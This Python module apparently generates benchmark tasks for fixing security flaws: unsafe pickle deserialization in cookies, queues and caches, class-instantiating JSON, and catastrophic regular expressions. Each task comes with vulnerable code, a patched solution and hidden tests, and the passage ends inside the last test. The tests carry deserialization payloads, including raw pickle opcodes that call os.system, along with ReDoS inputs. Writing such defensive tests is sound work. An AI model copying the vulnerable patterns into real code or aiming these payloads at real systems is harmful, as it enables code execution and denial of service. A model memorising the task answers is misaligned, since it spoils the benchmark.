"""Security families: unsafe deserialization (pickle, class-instantiating JSON), catastrophic regular expressions (checked with a hard time budget in a
child process), and code injection through eval, getattr dispatch, format strings and spreadsheet formulas. All payloads are inert: they only call a recording
function of the test module (`mark`)."""
from fx import dd, family

from . import _sec
from ._sec import patched, readme

P = _sec.PY_PRELUDE

MARK = P + dd(r'''
    import pickle

    CALLS = []


    def mark(tag="called"):
        """What every payload in these tests tries to run. It only records that it was called."""
        CALLS.append(tag)
        return tag


    class Bomb:
        """Pickles into a call of `mark`: loading the pickle is what runs it."""

        def __init__(self, tag="pickle"):
            self.tag = tag

        def __reduce__(self):
            return (mark, (self.tag,))


    class Marker:
        """A class whose construction is recorded."""

        def __init__(self, *args, **kwargs):
            CALLS.append("Marker")


''')

# =================================================================================================================================
#  deserialization
# =================================================================================================================================
DS = []

SESS = dd(r'''
    """Signed session cookies."""
    import base64
    import hashlib
    import hmac
    import pickle


    def _sign(payload, secret):
        return hmac.new(secret, payload.encode(), hashlib.sha256).hexdigest()


    def dump_session(data, secret):
        """The cookie value for the session dict `data`: `<payload>.<signature>`, where payload is the URL-safe base64 (no padding) of the serialised data and signature is the hex HMAC-SHA256
        of the payload under `secret` (bytes). Sessions only hold JSON-compatible data (dicts, lists, strings, numbers, booleans, null)."""
        payload = base64.urlsafe_b64encode(pickle.dumps(data)).rstrip(b"=").decode()
        return payload + "." + _sign(payload, secret)


    def load_session(cookie, secret):
        """The session dict. ValueError for malformed cookies, bad signatures and payloads that are not valid session data. Loading must never execute code or build arbitrary objects,
        not even when the signature is valid (secrets leak)."""
        payload, dot, signature = cookie.rpartition(".")
        if not dot or not hmac.compare_digest(signature, _sign(payload, secret)):
            raise ValueError("bad signature")
        return pickle.loads(base64.urlsafe_b64decode(payload + "=" * (-len(payload) % 4)))
''')

DS.append(dict(
    slug="session-pickle", d=2, product="the session cookies", func="load_session", cwe="CWE-502",
    finding="`load_session` feeds the cookie payload to `pickle.loads`. The HMAC is the only barrier, so anybody who obtains the signing secret (a leaked config, a backup, an old developer laptop) gets remote code execution on every web worker with a single forged cookie; the signature is not a license to unpickle.",
    start={"sessions.py": SESS, "README.md": readme("session cookies", "`dump_session(data, secret)` / `load_session(cookie, secret)` keep the cookie layout (`payload.signature`, URL-safe base64 payload, hex HMAC-SHA256 over the payload). The payload must be a data format that cannot execute code - JSON - and `load_session` raises `ValueError` for anything that is not a JSON object, whatever the signature says. Non-JSON data given to `dump_session` raises `TypeError`.")},
    solution={"sessions.py": patched(SESS, ('import pickle\n', 'import json\n'), (
        '        payload = base64.urlsafe_b64encode(pickle.dumps(data)).rstrip(b"=").decode()\n', '        payload = base64.urlsafe_b64encode(json.dumps(data, separators=(",", ":")).encode()).rstrip(b"=").decode()\n'), (
        '        return pickle.loads(base64.urlsafe_b64decode(payload + "=" * (-len(payload) % 4)))\n',
        '''        try:
            data = json.loads(base64.urlsafe_b64decode(payload + "=" * (-len(payload) % 4)).decode("utf-8"))
        except (ValueError, UnicodeDecodeError):
            raise ValueError("payload is not valid session data")
        if not isinstance(data, dict):
            raise ValueError("session data must be an object")
        return data
'''))},
    hidden={"tests/test_sessions_security.py": MARK + dd(r'''
        import base64
        import hashlib
        import hmac

        import sessions as m

        SECRET = b"known-to-the-attacker"


        def signed(raw):
            payload = base64.urlsafe_b64encode(raw).rstrip(b"=").decode()
            return payload + "." + hmac.new(SECRET, payload.encode(), hashlib.sha256).hexdigest()


        class SessionTest(unittest.TestCase):
            def setUp(self):
                del CALLS[:]

            def test_roundtrip(self):
                for data in [{"user": "ann", "admin": False, "n": [1, 2.5, None], "nested": {"k": "v\u00e9"}}, {}, {"a": [[], {}]}]:
                    cookie = m.dump_session(data, SECRET)
                    self.assertEqual(m.load_session(cookie, SECRET), data)
                    payload, sig = cookie.rsplit(".", 1)
                    self.assertEqual(sig, hmac.new(SECRET, payload.encode(), hashlib.sha256).hexdigest())
                    self.assertNotIn("=", payload)
                    self.assertEqual(base64.urlsafe_b64decode(payload + "=" * (-len(payload) % 4)).decode()[0], "{")
                self.assertIsNone(attempt(m.dump_session, {"x": {1, 2}}, SECRET))
                self.assertIsNone(attempt(m.dump_session, {"x": object()}, SECRET))

            def test_tampering(self):
                cookie = m.dump_session({"user": "ann"}, SECRET)
                payload, sig = cookie.rsplit(".", 1)
                forged = base64.urlsafe_b64encode(b'{"user":"root"}').rstrip(b"=").decode()
                for bad in [forged + "." + sig, payload + "." + "0" * 64, payload, "", ".", payload + "." + sig[:-1], "x." + sig]:
                    self.assertIsNone(attempt(m.load_session, bad, SECRET), bad)
                self.assertIsNone(attempt(m.load_session, cookie, b"other secret"))

            def test_signed_pickles_are_never_loaded(self):
                for proto in (0, 2, 4):
                    self.assertIsNone(attempt(m.load_session, signed(pickle.dumps(Bomb("session"), protocol=proto)), SECRET), proto)
                    self.assertIsNone(attempt(m.load_session, signed(pickle.dumps({"user": "ann"}, protocol=proto)), SECRET), proto)
                for raw in (b"[1, 2, 3]", b'"string"', b"42", b"null", b"\xff\xfe"):
                    self.assertIsNone(attempt(m.load_session, signed(raw), SECRET), raw)
                self.assertEqual(CALLS, [])


        if __name__ == "__main__":
            unittest.main()
    ''')},
))

WORKER = dd(r'''
    """Background job worker."""
    import pickle

    DONE = []


    def resize(path, width, height):
        DONE.append(("resize", path, width, height))
        return "resized %s to %dx%d" % (path, width, height)


    def thumbnail(path):
        DONE.append(("thumbnail", path))
        return "thumbnail of " + path


    JOBS = {"resize": resize, "thumbnail": thumbnail}


    def encode_job(name, params):
        """The bytes put on the queue for the job `name` with the keyword parameters `params` (a dict)."""
        return pickle.dumps((name, params))


    def handle(blob):
        """Run the job encoded in `blob` (made by `encode_job`) and return the job's result. Only the jobs in JOBS can be run, with exactly their parameters (`resize`: path str, width and height
        ints from 1 to 10000; `thumbnail`: path str); everything else - unknown jobs, missing, extra or mistyped parameters, undecodable blobs - raises ValueError and runs nothing.
        The queue is writable by other services, so decoding a blob must not be able to run code."""
        name, params = pickle.loads(blob)
        return JOBS[name](**params)
''')

DS.append(dict(
    slug="queue-jobs", d=3, product="the background worker", func="handle", cwe="CWE-502",
    finding="`handle` unpickles every message from the job queue; the queue is writable by several internal services and by a message-broker console that some staff can reach, so a crafted message executes arbitrary code in the worker (which holds the storage credentials).",
    start={"worker.py": WORKER, "README.md": readme("job worker", "`encode_job(name, params)` and `handle(blob)` keep their signatures. Jobs travel as JSON (`{\"job\": name, \"params\": {...}}`, UTF-8 bytes); `handle` validates the job name and parameters exactly as its docstring says and raises `ValueError` otherwise, including for old pickled blobs left in the queue. Nothing is executed for a rejected message.")},
    solution={"worker.py": patched(WORKER, ('import pickle\n', 'import json\n'), (
        '    return pickle.dumps((name, params))\n', '    return json.dumps({"job": name, "params": params}).encode("utf-8")\n'), (
        '''    name, params = pickle.loads(blob)
    return JOBS[name](**params)
''', '''    try:
        message = json.loads(blob.decode("utf-8"))
    except (ValueError, UnicodeDecodeError, AttributeError):
        raise ValueError("undecodable job")
    if not isinstance(message, dict) or set(message) != {"job", "params"} or not isinstance(message["params"], dict):
        raise ValueError("bad job message")
    name, params = message["job"], message["params"]
    if not isinstance(name, str) or name not in JOBS:
        raise ValueError("unknown job")

    def dim(v):
        return isinstance(v, int) and not isinstance(v, bool) and 1 <= v <= 10000

    if name == "resize" and set(params) == {"path", "width", "height"} and isinstance(params["path"], str) and dim(params["width"]) and dim(params["height"]):
        return resize(**params)
    if name == "thumbnail" and set(params) == {"path"} and isinstance(params["path"], str):
        return thumbnail(**params)
    raise ValueError("bad job parameters")
'''))},
    hidden={"tests/test_worker_security.py": MARK + dd(r'''
        import json

        import worker as m


        class WorkerTest(unittest.TestCase):
            def setUp(self):
                del CALLS[:]
                del m.DONE[:]

            def test_jobs_run(self):
                blob = m.encode_job("resize", {"path": "a.png", "width": 640, "height": 480})
                self.assertIsInstance(blob, bytes)
                self.assertEqual(json.loads(blob.decode()), {"job": "resize", "params": {"path": "a.png", "width": 640, "height": 480}})
                self.assertEqual(m.handle(blob), "resized a.png to 640x480")
                self.assertEqual(m.handle(m.encode_job("thumbnail", {"path": "b\u00fc.png"})), "thumbnail of b\u00fc.png")
                self.assertEqual(m.DONE, [("resize", "a.png", 640, 480), ("thumbnail", "b\u00fc.png")])
                self.assertEqual(m.handle(json.dumps({"job": "resize", "params": {"path": "x", "width": 1, "height": 10000}}).encode()), "resized x to 1x10000")

            def test_bad_messages(self):
                bad = [
                    pickle.dumps(Bomb("job")), pickle.dumps(("resize", {"path": "a", "width": 1, "height": 1})), pickle.dumps(("thumbnail", {"path": "a"}), protocol=0), b"", b"\x80\x04N.", b"\xff\xfe",
                    json.dumps({"job": "nope", "params": {}}).encode(), json.dumps({"job": "resize", "params": {"path": "a", "width": 1}}).encode(),
                    json.dumps({"job": "resize", "params": {"path": "a", "width": 1, "height": 1, "extra": 1}}).encode(), json.dumps({"job": "resize", "params": {"path": "a", "width": "5", "height": 1}}).encode(),
                    json.dumps({"job": "resize", "params": {"path": "a", "width": True, "height": 1}}).encode(), json.dumps({"job": "resize", "params": {"path": "a", "width": 0, "height": 1}}).encode(),
                    json.dumps({"job": "resize", "params": {"path": "a", "width": 10001, "height": 1}}).encode(), json.dumps({"job": "resize", "params": {"path": 5, "width": 1, "height": 1}}).encode(),
                    json.dumps({"job": "thumbnail", "params": {"path": "a", "width": 1}}).encode(), json.dumps({"job": "__import__", "params": {}}).encode(), json.dumps({"job": ["resize"], "params": {}}).encode(),
                    json.dumps(["resize", {}]).encode(), json.dumps({"job": "thumbnail"}).encode(), json.dumps({"job": "thumbnail", "params": []}).encode(), json.dumps({"job": "thumbnail", "params": {"path": "a"}, "x": 1}).encode(),
                ]
                for blob in bad:
                    with self.assertRaises(ValueError):
                        m.handle(blob)
                self.assertEqual(CALLS, [])
                self.assertEqual(m.DONE, [])


        if __name__ == "__main__":
            unittest.main()
    ''')},
))

CACHE = dd(r'''
    """On-disk cache of computed values."""
    import hashlib
    import os
    import pickle


    class DiskCache:
        def __init__(self, directory):
            self.directory = directory
            os.makedirs(directory, exist_ok=True)

        def _path(self, key):
            return os.path.join(self.directory, hashlib.sha1(key.encode()).hexdigest() + ".pkl")

        def set(self, key, value):
            """Store a JSON-compatible value (dicts, lists, strings, numbers, booleans, null) under `key`."""
            with open(self._path(key), "wb") as fh:
                pickle.dump(value, fh)

        def get(self, key, default=None):
            """The stored value, or `default` when there is none or the stored data is unusable. The cache directory is shared with other tools and with old versions of this program (which stored
            `<sha1 of key>.pkl` pickle files): decoding stored data must never execute code, and old pickle files are simply cache misses."""
            try:
                with open(self._path(key), "rb") as fh:
                    return pickle.load(fh)
            except FileNotFoundError:
                return default

        def delete(self, key):
            """Remove the stored value if there is one."""
            try:
                os.remove(self._path(key))
            except FileNotFoundError:
                pass
''')

DS.append(dict(
    slug="cache-pickle", d=3, product="the shared disk cache", func="DiskCache.get", cwe="CWE-502",
    finding="`DiskCache.get` unpickles whatever file sits at the cache path; the cache directory is shared with other tools (and world-writable on some CI machines), so planting a crafted `<hash>.pkl` there gives code execution to the next program that reads that key.",
    start={"diskcache.py": CACHE, "README.md": readme("disk cache", "The cache stores JSON: `set` writes `<sha256 of key>.json`, `get` reads it back (misses, malformed JSON and unusable files give `default`), `delete` removes it. Old `<sha1>.pkl` files are ignored - never unpickled - and `delete` leaves them alone. Keys are strings.")},
    solution={"diskcache.py": patched(CACHE, ('import hashlib\nimport os\nimport pickle\n', 'import hashlib\nimport json\nimport os\n'), (
        '        return os.path.join(self.directory, hashlib.sha1(key.encode()).hexdigest() + ".pkl")\n', '        return os.path.join(self.directory, hashlib.sha256(key.encode()).hexdigest() + ".json")\n'), (
        '''            with open(self._path(key), "wb") as fh:
                pickle.dump(value, fh)
''', '''            with open(self._path(key), "w", encoding="utf-8") as fh:
                json.dump(value, fh)
'''), (
        '''            try:
                with open(self._path(key), "rb") as fh:
                    return pickle.load(fh)
            except FileNotFoundError:
                return default
''', '''            try:
                with open(self._path(key), "r", encoding="utf-8") as fh:
                    return json.load(fh)
            except (OSError, ValueError):
                return default
'''))},
    hidden={"tests/test_diskcache_security.py": MARK + dd(r'''
        import hashlib
        import json

        import diskcache as m


        class CacheTest(unittest.TestCase):
            def setUp(self):
                del CALLS[:]
                self.dir = os.path.join(tmpdir(), "cache")
                self.addCleanup(shutil.rmtree, os.path.dirname(self.dir), True)
                self.c = m.DiskCache(self.dir)

            def test_values(self):
                for value in [{"a": [1, 2.5, None, True], "b": {"c": "\u00e9"}}, [], "text", 7, None, False]:
                    self.c.set("key", value)
                    self.assertEqual(self.c.get("key"), value)
                self.assertEqual(self.c.get("missing"), None)
                self.assertEqual(self.c.get("missing", "dflt"), "dflt")
                self.c.set("k2", {"x": 1})
                self.c.delete("k2")
                self.assertEqual(self.c.get("k2", 0), 0)
                self.c.delete("never-set")
                files = os.listdir(self.dir)
                self.assertTrue(files and all(f.endswith(".json") for f in files), files)
                self.assertEqual(json.load(open(os.path.join(self.dir, hashlib.sha256(b"key").hexdigest() + ".json"))), False)

            def test_planted_pickles_are_misses(self):
                for key in ["report", "user:1"]:
                    legacy = os.path.join(self.dir, hashlib.sha1(key.encode()).hexdigest() + ".pkl")
                    write(legacy, pickle.dumps(Bomb("cache")))
                    self.assertEqual(self.c.get(key, "miss"), "miss")
                    self.c.delete(key)
                    self.assertTrue(os.path.exists(legacy))
                    for name in (hashlib.sha256(key.encode()).hexdigest() + ".json",):
                        write(os.path.join(self.dir, name), pickle.dumps(Bomb("cache2")))
                        self.assertEqual(self.c.get(key, "miss"), "miss")
                        write(os.path.join(self.dir, name), "{not json")
                        self.assertEqual(self.c.get(key, "miss"), "miss")
                self.assertEqual(CALLS, [])


        if __name__ == "__main__":
            unittest.main()
    ''')},
))

JSONOBJ = dd(r'''
    """JSON serialisation of the drawing objects."""
    import importlib
    import json


    class Point:
        def __init__(self, x, y):
            self.x, self.y = x, y

        def __eq__(self, other):
            return isinstance(other, Point) and (self.x, self.y) == (other.x, other.y)


    class Shape:
        def __init__(self, name, points):
            self.name, self.points = name, points

        def __eq__(self, other):
            return isinstance(other, Shape) and (self.name, self.points) == (other.name, other.points)


    def _encode(obj):
        if isinstance(obj, (Point, Shape)):
            data = dict(vars(obj))
            data["__class__"] = "jsonobjects." + type(obj).__name__
            return data
        raise TypeError("not serialisable: %r" % (obj,))


    def _decode(data):
        if "__class__" in data:
            module, _, name = data["__class__"].rpartition(".")
            cls = getattr(importlib.import_module(module), name)
            return cls(**{k: v for k, v in data.items() if k != "__class__"})
        return data


    def dumps(obj):
        return json.dumps(obj, default=_encode, sort_keys=True)


    def loads(text):
        """The object graph in `text`. Objects with a `__class__` entry are rebuilt as `Point` or `Shape` - and only those two (the entry must be exactly `jsonobjects.Point` or `jsonobjects.Shape`,
        and the other keys must be the constructor parameters); any other class name is a ValueError, and nothing else is imported or instantiated."""
        return json.loads(text, object_hook=_decode)
''')

DS.append(dict(
    slug="json-class-hook", d=3, product="the drawing editor", func="loads", cwe="CWE-502",
    finding="`loads` rebuilds objects from a `__class__` key by importing any module and instantiating any class named in the document, with attacker-chosen keyword arguments: a shared drawing file can construct arbitrary classes inside the editor process (the JSON equivalent of unsafe pickle).",
    start={"jsonobjects.py": JSONOBJ, "README.md": readme("drawing files", "`dumps`/`loads` keep their format. `loads` accepts `__class__` only for the two registered names `jsonobjects.Point` and `jsonobjects.Shape` (exact match, with exactly the constructor's parameters as the other keys: Point `x`, `y`; Shape `name`, `points`) and raises `ValueError` for anything else, including nested occurrences. Plain JSON documents load as before. Nothing outside the registry may be imported or instantiated while loading.")},
    solution={"jsonobjects.py": patched(JSONOBJ, (
        '''    if "__class__" in data:
        module, _, name = data["__class__"].rpartition(".")
        cls = getattr(importlib.import_module(module), name)
        return cls(**{k: v for k, v in data.items() if k != "__class__"})
    return data
''', '''    if "__class__" in data:
        registry = {"jsonobjects.Point": (Point, {"x", "y"}), "jsonobjects.Shape": (Shape, {"name", "points"})}
        entry = registry.get(data["__class__"]) if isinstance(data["__class__"], str) else None
        if entry is None:
            raise ValueError("class not allowed: %r" % (data["__class__"],))
        cls, params = entry
        fields = {k: v for k, v in data.items() if k != "__class__"}
        if set(fields) != params:
            raise ValueError("bad parameters for %s" % cls.__name__)
        return cls(**fields)
    return data
'''), ('import importlib\nimport json\n', 'import json\n'))},
    hidden={"tests/test_jsonobjects_security.py": MARK + dd(r'''
        import json

        import jsonobjects as m


        class JsonObjectsTest(unittest.TestCase):
            def setUp(self):
                del CALLS[:]

            def test_roundtrip(self):
                shape = m.Shape("tri", [m.Point(0, 0), m.Point(1.5, 0), m.Point(0, 2)])
                text = m.dumps({"shapes": [shape], "meta": {"n": 1, "ok": True, "none": None}})
                back = m.loads(text)
                self.assertEqual(back["shapes"][0], shape)
                self.assertEqual(back["meta"], {"n": 1, "ok": True, "none": None})
                self.assertEqual(m.loads('{"a": [1, {"b": "c"}]}'), {"a": [1, {"b": "c"}]})
                self.assertEqual(m.loads('{"__class__": "jsonobjects.Point", "x": 1, "y": 2}'), m.Point(1, 2))

            def test_other_classes_are_refused(self):
                me = MARK_MODULE
                for text in ['{"__class__": "%s.Marker"}' % me, '{"__class__": "%s.Marker", "a": 1}' % me, '[{"k": {"__class__": "%s.Marker", "x": 1}}]' % me, '{"__class__": "%s.mark", "tag": "x"}' % me,
                             '{"__class__": "collections.OrderedDict"}', '{"__class__": "jsonobjects.Marker"}', '{"__class__": "jsonobjects.Point", "x": 1}', '{"__class__": "jsonobjects.Point", "x": 1, "y": 2, "z": 3}',
                             '{"__class__": "Point", "x": 1, "y": 2}', '{"__class__": "jsonobjects.Shape", "name": "a", "points": [], "extra": 1}', '{"__class__": 5}', '{"__class__": null}',
                             '{"__class__": ["jsonobjects.Point"], "x": 1, "y": 2}', '{"__class__": "builtins.print", "end": ""}', '{"__class__": "jsonobjects.Point ", "x": 1, "y": 2}']:
                    self.assertIsNone(attempt(m.loads, text), text)
                self.assertEqual(CALLS, [])


        MARK_MODULE = __name__

        if __name__ == "__main__":
            unittest.main()
    ''')},
))

SHAPES = dd(r'''
    """Geometry objects exchanged between the layout workers."""
    import pickle


    class Point:
        def __init__(self, x, y):
            self.x, self.y = x, y

        def __eq__(self, other):
            return type(other) is Point and (self.x, self.y) == (other.x, other.y)

        def __repr__(self):
            return "Point(%r, %r)" % (self.x, self.y)


    class Rect:
        def __init__(self, a, b, tags=()):
            self.a, self.b, self.tags = a, b, set(tags)

        def __eq__(self, other):
            return type(other) is Rect and (self.a, self.b, self.tags) == (other.a, other.b, other.tags)


    def dumps(obj):
        return pickle.dumps(obj, protocol=4)


    def loads(blob):
        """Rebuild an object graph sent by another worker. Allowed: this module's `Point` and `Rect`, `set`, `frozenset` and `complex`, and the plain containers and scalars (lists, tuples, dicts,
        strings, numbers, booleans, None, and bytes with protocol 3 and up). Anything else - any other class or function, wherever it lives - raises pickle.UnpicklingError and nothing is called: workers receive messages
        from components that are less trusted than they are."""
        return pickle.loads(blob)
''')

DS.append(dict(
    slug="restricted-unpickler", d=4, product="the layout workers", func="loads", cwe="CWE-502",
    finding="`loads` is a bare `pickle.loads` on messages that arrive from less trusted components: a message can name any importable callable (`os.system`, `subprocess.Popen`, `builtins.eval`, `builtins.getattr`...) and the unpickler calls it. The messages legitimately carry `Point`, `Rect` and a few builtin types, so the format has to stay; the set of allowed classes does not.",
    start={"shapes.py": SHAPES, "README.md": readme("layout messages", "`dumps`/`loads` keep the pickle format (protocols 2 to 5 must load), but `loads` uses an `Unpickler` subclass whose `find_class` only admits `shapes.Point`, `shapes.Rect`, `builtins.set`, `builtins.frozenset` and `builtins.complex` (older protocols spell the module `__builtin__`, which counts as `builtins`); every other global raises `pickle.UnpicklingError` before anything is called. Persistent ids (`persistent_load`) are refused as well.")},
    solution={"shapes.py": patched(SHAPES, ('import pickle\n', 'import io\nimport pickle\n'), (
        '''def loads(blob):''', '''ALLOWED = {("shapes", "Point"), ("shapes", "Rect"), ("builtins", "set"), ("builtins", "frozenset"), ("builtins", "complex")}


class _Unpickler(pickle.Unpickler):
    def find_class(self, module, name):
        if module == "__builtin__":          # protocols 0-2 spell the builtins module this way
            module = "builtins"
        if (module, name) in ALLOWED:
            return super().find_class(module, name)
        raise pickle.UnpicklingError("global %s.%s is not allowed" % (module, name))

    def persistent_load(self, pid):
        raise pickle.UnpicklingError("persistent ids are not allowed")


def loads(blob):'''), (
        '    return pickle.loads(blob)\n', '    return _Unpickler(io.BytesIO(blob)).load()\n'))},
    hidden={"tests/test_shapes_security.py": MARK + dd(r'''
        import collections
        import datetime

        import shapes as m


        class ShapesTest(unittest.TestCase):
            def setUp(self):
                del CALLS[:]

            def test_legit_messages(self):
                objs = [m.Point(1, 2), m.Rect(m.Point(0, 0), m.Point(3, 4), tags=["a", "b"]), [m.Point(1, 1), (1, 2.5, "x", None, True), {"k": m.Rect(m.Point(0, 0), m.Point(1, 1))}],
                        {1, 2, 3}, frozenset({"a"}), 3 + 4j, {"nested": [{"deep": (m.Point(5, 6),)}]}, "plain", 42, None]
                self.assertEqual(m.loads(pickle.dumps([b"by", (b"x",)], protocol=4)), [b"by", (b"x",)])
                for obj in objs:
                    for proto in (2, 3, 4, 5):
                        self.assertEqual(m.loads(pickle.dumps(obj, protocol=proto)), obj, (obj, proto))
                    self.assertEqual(m.loads(m.dumps(obj)), obj)

            def test_other_globals_are_refused(self):
                payloads = [pickle.dumps(Bomb("worker"), protocol=p) for p in (0, 2, 4, 5)]
                payloads += [pickle.dumps(collections.OrderedDict(a=1)), pickle.dumps(datetime.date(2024, 1, 1)), pickle.dumps(Marker()), pickle.dumps([m.Point(1, 2), Bomb("nested")]),
                             pickle.dumps(collections.Counter("abc"), protocol=2), pickle.dumps(len), pickle.dumps(print, protocol=2)]
                del CALLS[:]            # building the Marker payload constructed one
                payloads += [b"cos\nsystem\n(S'echo INJECTED'\ntR.", b"cbuiltins\nprint\n.", b"ctest_nothing\nnothing\n.", b"cposix\nsystem\n.", b"csubprocess\nPopen\n."]
                for blob in payloads:
                    with self.assertRaises(pickle.UnpicklingError):
                        m.loads(blob)
                self.assertEqual(CALLS, [])
                self.assertIsNone(attempt(m.loads, b"not a pickle"))
                self.assertIsNone(attempt(m.loads, b"Q."))


        if __name__ == "__main__":
            unittest.main()
    ''')},
))

DS_ORDER = ["session-pickle", "queue-jobs", "cache-pickle", "json-class-hook", "restricted-unpickler"]
DS.sort(key=lambda s: (s["d"], DS_ORDER.index(s["slug"])))


@family("security-deserialization", category="security", lang="python", kind="fix", n=5,
        summary="unsafe deserialization: pickle in cookies, queues, caches and RPC, class-instantiating JSON, restricted unpicklers")
def gen_deser(rng, n):
    return list(_sec.emit(rng, DS[:n], tags=["deserialization"]))


# =================================================================================================================================
#  regular expression denial of service
# =================================================================================================================================
RX = []

RXT = P + dd(r'''
    import subprocess


    def finishes(call, module, timeout=2.0):
        """Run `call` (Python source, the module under test is `m`) in a fresh interpreter; True when it ends normally within `timeout` seconds (a catastrophic regex does not)."""
        code = "import sys; sys.path.insert(0, %r); import %s as m; %s" % (ROOT, module, call)
        try:
            done = subprocess.run([sys.executable, "-c", code], timeout=timeout, capture_output=True)
        except subprocess.TimeoutExpired:
            return False
        return done.returncode == 0


''')

NAMES = dd(r'''
    """Validation of display names."""
    import re

    NAME = re.compile(r"^(\w+\s?)*$")


    def is_valid_name(text):
        """True when `text` is made of words (letters, digits, underscores) separated by single whitespace characters; one trailing whitespace character is tolerated; the empty string is valid.
        Leading whitespace, two whitespace characters in a row and any other character are invalid. Must be fast for any input."""
        return bool(NAME.match(text))
''')

RX.append(dict(
    slug="display-name", d=1, product="the sign-up form", func="is_valid_name", cwe="CWE-1333",
    finding="`NAME` is `^(\\w+\\s?)*$`: a name such as `aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!` makes the matcher try an exponential number of ways to split the word before it gives up, and a few such requests keep every worker busy (ReDoS).",
    start={"names.py": NAMES, "README.md": readme("names", "`is_valid_name(text)` keeps accepting and rejecting exactly what its docstring describes (`Ann`, `Ann Lee`, `Ann ` and the empty string are valid; ` Ann`, `Ann  Lee`, `Ann!` are not) and answers in linear time for any input, including 100000 characters.")},
    solution={"names.py": patched(NAMES, ('NAME = re.compile(r"^(\\w+\\s?)*$")', 'NAME = re.compile(r"(?:\\w+\\s)*\\w*")'), ('return bool(NAME.match(text))', 'return NAME.fullmatch(text) is not None'))},
    hidden={"tests/test_names_security.py": RXT + dd(r'''
        import names as m


        class NameTest(unittest.TestCase):
            def test_table(self):
                for text in ["", "Ann", "Ann Lee", "Ann ", "a b c d", "snake_case 42", "Ann\tLee", "\u00c9mile Zola", "x" * 5000, " ".join(["w"] * 2000)]:
                    self.assertTrue(m.is_valid_name(text), text[:20])
                for text in [" Ann", "Ann  Lee", "Ann!", "Ann-Lee", "Ann  ", "  ", " ", "a b  c", "Ann Lee!", "!", "Ann.", "\u00c9mile, Zola"]:
                    self.assertFalse(m.is_valid_name(text), text)

            def test_adversarial_inputs_finish(self):
                for payload in ['"a" * 40 + "!"', '"ab " * 20 + "!"', '"a" * 100000 + "!"', '("a " * 50000) + "!"']:
                    self.assertTrue(finishes("assert m.is_valid_name(%s) is False" % payload, "names"), payload)


        if __name__ == "__main__":
            unittest.main()
    ''')},
))

TRAILING = dd(r'''
    """Text clean-up for imported comments."""
    import re


    def strip_trailing(text):
        """`text` without its trailing whitespace (spaces, tabs, line breaks and other Unicode whitespace). Must be fast for any input, including 100000 spaces in the middle of a line."""
        return re.sub(r"\s+$", "", text)
''')

RX.append(dict(
    slug="trailing-whitespace", d=2, product="the comment importer", func="strip_trailing", cwe="CWE-1333",
    finding="`strip_trailing` removes trailing whitespace with `re.sub(r\"\\s+$\", ...)`. For a line that has a long run of spaces followed by a non-space character the regex engine retries the match from every position of the run, which takes quadratic time: a 50 KB comment keeps a worker busy for minutes.",
    start={"clean.py": TRAILING, "README.md": readme("text clean-up", "`strip_trailing(text)` returns the text without trailing whitespace (everything `str.isspace` accepts, line breaks included) and leaves everything else - including whitespace in the middle - alone. Linear time for every input.")},
    solution={"clean.py": patched(TRAILING, ('"""Text clean-up for imported comments."""\nimport re\n', '"""Text clean-up for imported comments."""\n'), ('    return re.sub(r"\\s+$", "", text)\n', '    return text.rstrip()\n'))},
    hidden={"tests/test_clean_security.py": RXT + dd(r'''
        import clean as m


        class CleanTest(unittest.TestCase):
            def test_table(self):
                for text, want in [("abc  ", "abc"), ("abc \t\n", "abc"), ("  abc", "  abc"), ("a  b", "a  b"), ("", ""), ("   ", ""), ("x\n\n\n", "x"), ("a\u00a0\u2003", "a"), ("a b \n c  ", "a b \n c"), ("tab\there", "tab\there")]:
                    self.assertEqual(m.strip_trailing(text), want, repr(text))

            def test_adversarial_inputs_finish(self):
                for payload in ['"x" + " " * 60000 + "y"', '"a" + "\\t " * 40000 + "b"', '(" " * 100000) + "z"']:
                    self.assertTrue(finishes("m.strip_trailing(%s)" % payload, "clean"), payload)
                self.assertEqual(m.strip_trailing("x" + " " * 100000), "x")


        if __name__ == "__main__":
            unittest.main()
    ''')},
))

EMAIL = dd(r'''
    """E-mail address check of the newsletter form."""
    import re

    EMAIL = re.compile(r"^([a-zA-Z0-9]+[._-]?)+@([a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}$")


    def is_valid_email(text):
        """True for addresses of the form `local@domain`: the local part is letters and digits in runs separated by single `.`, `_` or `-` (no separator at the start or end, no two in a row);
        the domain is dot-separated labels of letters, digits and hyphens followed by a top-level domain of 2 or more letters. Must be fast for any input."""
        return bool(EMAIL.match(text))
''')

RX.append(dict(
    slug="email-regex", d=2, product="the newsletter form", func="is_valid_email", cwe="CWE-1333",
    finding="`EMAIL` nests a quantifier inside a quantifier (`([a-zA-Z0-9]+[._-]?)+`): a local part of 30 letters followed by a character that is not allowed makes the matcher try billions of combinations, so one malformed sign-up request can pin a CPU for minutes.",
    start={"emails.py": EMAIL, "README.md": readme("e-mail check", "`is_valid_email(text)` follows its docstring (note: no separator at the end of the local part, unlike the old pattern, which also let `a.@example.com` through). `a.b@example.com`, `a_b-c.d@sub.example.org` are valid; `a..b@x.com`, `.a@x.com`, `a.@x.com`, `a@x`, `a@x.c`, `a b@x.com` are not. Answers in linear time for any input.")},
    solution={"emails.py": patched(EMAIL, ('EMAIL = re.compile(r"^([a-zA-Z0-9]+[._-]?)+@([a-zA-Z0-9-]+\\.)+[a-zA-Z]{2,}$")', 'EMAIL = re.compile(r"[a-zA-Z0-9]+(?:[._-][a-zA-Z0-9]+)*@(?:[a-zA-Z0-9-]+\\.)+[a-zA-Z]{2,}")'), ('return bool(EMAIL.match(text))', 'return EMAIL.fullmatch(text) is not None'))},
    hidden={"tests/test_emails_security.py": RXT + dd(r'''
        import emails as m


        class EmailTest(unittest.TestCase):
            def test_table(self):
                for text in ["a.b@example.com", "a_b-c.d@sub.example.org", "x@y.io", "A1.b2_c3@Mail-Server.example.COM", "u@a-b.co", "n" * 200 + "@example.com"]:
                    self.assertTrue(m.is_valid_email(text), text[:30])
                for text in ["a..b@x.com", ".a@x.com", "a.@x.com", "a@x", "a@x.c", "a b@x.com", "", "@x.com", "a@.com", "a@x..com", "a@-.com1", "a@x.com\n", "a@x.com ", "a+b@x.com", "a@x.c0m", "a--b@x.com", "a@x_y.com", "plain"]:
                    self.assertFalse(m.is_valid_email(text), repr(text))

            def test_adversarial_inputs_finish(self):
                for payload in ['"a" * 40 + "!"', '"a." * 30 + "!"', '"a" * 100000 + "@"', '"a@" + "b." * 30 + "!"', '"a" * 50000 + "@x." + "b" * 50000 + "1"']:
                    self.assertTrue(finishes("assert m.is_valid_email(%s) is False" % payload, "emails"), payload)


        if __name__ == "__main__":
            unittest.main()
